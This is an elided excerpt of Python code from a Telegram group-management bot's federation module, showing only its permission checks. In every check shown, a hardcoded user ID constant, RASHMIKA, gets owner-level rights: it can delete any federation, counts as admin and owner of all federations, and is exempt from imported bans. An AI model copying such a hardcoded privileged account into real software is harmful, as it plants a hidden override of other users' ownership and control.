...
from RashmikaBot import DRAGONS, EVENT_LOGS, LOGGER, OWNER_ID, TIGERS, WOLVES, dispatcher, RASHMIKA
...
def del_fed(update: Update, context: CallbackContext):
    ...
    if args:
        ...
        if getinfo is False:
            ...
            return
        if int(getinfo["owner"]) == int(user.id) or int(user.id) == OWNER_ID or int(user.id) == RASHMIKA:
            fed_id = is_fed_id
        else:
...
def fed_ban(update: Update, context: CallbackContext):
    ...
    if user_id == OWNER_ID or user_id == RASHMIKA:
            ...
            with BytesIO() as file:
                ...
                for x in splitting:
                    ...
                    if str(import_userid) == str(OWNER_ID):
                        failed += 1
                        continue
                    if int(import_userid) in DRAGONS or int(import_userid) == RASHMIKA:
                        failed += 1
                        continue
...
def is_user_fed_admin(fed_id, user_id):
    ...
    if fed_admins is False:
        return False
    if int(user_id) in fed_admins or int(user_id) == OWNER_ID or int(user_id) == RASHMIKA:
        return True
    else:
        return False
...
def is_user_fed_owner(fed_id, user_id):
    ...
    if str(user_id) == getfedowner or int(user_id) == OWNER_ID or int(user_id) == RASHMIKA:
        return True
    else:
        return False
